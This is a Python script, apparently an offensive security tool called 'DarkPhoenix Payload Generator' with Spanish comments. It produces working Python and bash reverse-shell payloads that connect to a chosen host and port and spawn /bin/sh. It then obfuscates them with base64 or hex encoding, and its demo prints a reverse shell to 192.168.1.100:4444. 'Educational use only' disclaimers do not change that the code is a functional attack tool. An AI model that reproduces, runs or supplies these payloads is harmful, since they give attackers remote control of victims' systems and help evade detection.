# offensive/payload_gen.py
```bash
import base64
import random
import string
from cryptography.fernet import Fernet
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("DarkPhoenixPayload")

class DarkPhoenixPayloadGenerator:
    def __init__(self):
        self.encryption_key = Fernet.generate_key()
        self.fernet = Fernet(self.encryption_key)
    
    def generate_reverse_shell(self, lhost: str, lport: int, payload_type: str = "python") -> str:
        """Genera reverse shell payloads (SOLO EDUCATIVO)"""
        payloads = {
            "python": f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
""",
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        }
        
        if payload_type not in payloads:
            raise ValueError(f"Tipo de payload no soportado: {payload_type}")
        
        return payloads[payload_type].strip()

    def obfuscate_payload(self, payload: str, method: str = "base64") -> str:
        """Ofusca el payload usando diferentes métodos"""
        if method == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif method == "hex":
            return payload.encode().hex()
        else:
            return payload

def payload_demo():
    """Demostración del generador de payloads"""
    print("🔥 DarkPhoenix Payload Generator")
    print("=" * 50)
    print("⚠️  SOLO PARA FINES EDUCATIVOS Y ENTORNOS CONTROLADOS\n")
    
    generator = DarkPhoenixPayloadGenerator()
    
    # Generar reverse shell
    print("🔧 Generando reverse shell Python...")
    payload = generator.generate_reverse_shell("192.168.1.100", 4444, "python")
    print(f"Payload original:\n{payload}")
    
    # Ofuscar payload
    print("\n🔒 Ofuscando payload con Base64...")
    obfuscated = generator.obfuscate_payload(payload, "base64")
    print(f"Payload ofuscado:\n{obfuscated}")
    
    print("\n✅ Demo completada - Usar solo en sistemas autorizados")

if __name__ == "__main__":
    payload_demo()
```
